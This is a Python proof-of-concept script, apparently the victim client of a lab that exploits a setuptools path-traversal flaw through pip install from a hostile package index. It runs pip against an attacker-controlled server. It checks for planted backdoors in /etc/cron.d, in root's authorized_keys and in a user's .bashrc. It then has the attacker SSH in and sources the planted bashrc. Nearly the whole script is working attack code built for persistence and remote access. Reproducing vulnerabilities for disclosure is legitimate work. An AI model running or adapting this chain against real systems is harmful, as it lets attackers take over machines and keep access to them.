#!/usr/bin/env python3
"""
Victim Client - Triggers path traversal via pip install

Simply runs: pip install malicious-package --index-url http://server:8080/simple/

The vulnerability triggers when:
1. pip downloads and extracts the package
2. setup.py runs with setup_requires=["triggerpkg"]
3. setuptools' PackageIndex fetches triggerpkg from malicious server
4. Server returns URL with path traversal, file written to arbitrary location
"""

import os
import subprocess
import sys
import time
import urllib.request

TARGET_DIRS = ["/etc/cron.d", "/root/.ssh", "/home/victim"]


def setup_environment():
    print("[VICTIM] Creating target directories...")
    for d in TARGET_DIRS:
        os.makedirs(d, exist_ok=True)


def wait_for_server(host, port, timeout=30):
    import socket
    print(f"[VICTIM] Waiting for server {host}:{port}...")
    start = time.time()
    while time.time() - start < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((host, port)) == 0:
                sock.close()
                print("[VICTIM] Server is up!")
                return True
            sock.close()
        except:
            pass
        time.sleep(1)
    return False


def run_attack(server_host, server_port, scenario):
    """Run pip install and check if path traversal succeeded."""

    targets = {
        "cron": "/etc/cron.d/backdoor",
        "ssh": "/root/.ssh/authorized_keys",
        "bashrc": "/home/victim/.bashrc",
    }
    target = targets[scenario]

    print(f"\n{'='*60}")
    print(f"ATTACK: {scenario.upper()}")
    print(f"{'='*60}")

    # Set scenario on server
    try:
        urllib.request.urlopen(f"http://{server_host}:{server_port}/scenario/{scenario}")
    except:
        pass
    time.sleep(0.5)

    index_url = f"http://{server_host}:{server_port}/simple/"

    print(f"\n[VICTIM] Running: pip install malicious-package --index-url {index_url}")
    print(f"[VICTIM] Expected write: {target}\n")

    # THE ATTACK: pip install from malicious index
    # Server redirects unknown packages (setuptools, etc) to real PyPI
    result = subprocess.run(
        [
            sys.executable, "-m", "pip", "install",
            "--index-url", index_url,
            "--trusted-host", server_host,
            "--no-cache-dir",
            "--force-reinstall",
            "malicious-package"
        ],
        capture_output=True,
        text=True,
        timeout=120
    )

    print("[OUTPUT]")
    print(result.stdout)
    if result.stderr:
        print(result.stderr)

    # Check if file was written via path traversal
    if os.path.exists(target):
        print(f"\n[EXPLOITED] File written: {target}")
        print("-" * 40)
        with open(target) as f:
            print(f.read())
        print("-" * 40)
        return True
    else:
        print(f"\n[FAILED] {target} not created")
        return False


def validate(server_host, server_port):
    """Validate attack impact."""
    print(f"\n{'='*60}")
    print("VALIDATION")
    print(f"{'='*60}")

    # SSH validation
    if os.path.exists("/root/.ssh/authorized_keys"):
        print("\n[SSH] authorized_keys exists:")
        with open("/root/.ssh/authorized_keys") as f:
            print(f.read()[:100])
        print("[*] Asking attacker to SSH in...")
        try:
            resp = urllib.request.urlopen(f"http://{server_host}:{server_port}/validate/ssh", timeout=15)
            if b"SSH_OK" in resp.read():
                print("[!] ATTACKER SSH'd INTO VICTIM!")
        except Exception as e:
            print(f"[-] SSH validation: {e}")

    # Cron validation
    if os.path.exists("/etc/cron.d/backdoor"):
        print("\n[CRON] backdoor exists:")
        with open("/etc/cron.d/backdoor") as f:
            print(f.read())

    # Bashrc validation
    if os.path.exists("/home/victim/.bashrc"):
        print("\n[BASHRC] backdoor exists, triggering...")
        subprocess.run(["bash", "-c", "source /home/victim/.bashrc"], capture_output=True, timeout=5)
        time.sleep(2)


def main():
    server_host = os.environ.get("SERVER_HOST", "server")
    server_port = int(os.environ.get("SERVER_PORT", "8080"))

    print("=" * 60)
    print("SETUPTOOLS PATH TRAVERSAL - PIP INSTALL ATTACK")
    print("=" * 60)

    setup_environment()

    if not wait_for_server(server_host, server_port):
        print("[VICTIM] Server not reachable")
        sys.exit(1)

    time.sleep(1)

    results = []
    for scenario in ["cron", "ssh", "bashrc"]:
        results.append((scenario, run_attack(server_host, server_port, scenario)))
        time.sleep(1)

    print(f"\n{'='*60}")
    print("SUMMARY")
    print("=" * 60)
    for name, success in results:
        print(f"  [{('EXPLOITED' if success else 'FAILED')}] {name}")

    validate(server_host, server_port)

    print(f"\n{'='*60}")
    print("COMPLETE")
    print("=" * 60)

    return 0 if all(r[1] for r in results) else 1


if __name__ == "__main__":
    sys.exit(main())
